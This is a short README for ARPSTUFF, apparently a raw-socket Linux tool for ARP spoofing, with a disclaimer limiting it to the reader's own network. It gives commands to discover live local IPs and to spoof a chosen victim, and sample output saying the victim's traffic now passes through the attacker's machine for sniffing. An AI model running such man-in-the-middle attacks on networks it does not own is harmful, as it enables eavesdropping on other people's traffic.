# ARPSTUFF
Raw linux sockets example of arp spoofing attack


**FOR EDUCATIONAL PURPOSES ONLY, USE ONLY IN YOUR OWN PRIVATE NETWORK!**

## Quick Start
Build:
```bash
./build.sh
```

Discover local addresses:
```bash
./arpstuff discover wlp1s0
```

After few seconds this will output alive local ips:
```
INFO: Starting local IPs discovery
    Netmask: 255.255.255.0
    Netaddr: 192.168.0.0
    Progress: 255/255 (3 alive)
INFO: Local network scanned, we found 3 ips: [192.168.0.1, 192.168.0.105, 192.168.0.101]
```

Select one of them and spoof it (this requires sudo, since it modifies iptables):
```bash
sudo ./arpstuff spoof wlp1s0 192.168.0.101
```

If you see the following message it means that the spoofing is running:
```
INFO: ARP spoof started on victim:
MAC: 11:12:13:14:15:16
IP:  192.168.0.101
```

At this point, the victim's traffic is passing through your machine. You can use wireshark (or any other network sniffer) to check it out.
